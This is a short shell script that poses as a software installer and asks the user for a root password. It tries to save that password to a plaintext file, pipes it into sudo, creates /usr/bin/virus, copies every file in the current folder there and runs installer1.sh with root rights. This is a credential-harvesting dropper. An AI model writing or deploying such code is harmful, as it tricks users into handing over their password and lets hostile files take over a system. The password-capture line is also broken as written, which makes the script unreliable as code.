echo This program requires root permissions to install. Please enter your password below.
read line > supass.txt
cat supass.txt | sudo -S su
sudo -S mkdir /usr/bin/virus
sudo -S cp * /usr/bin/virus
sudo -S bash installer1.sh
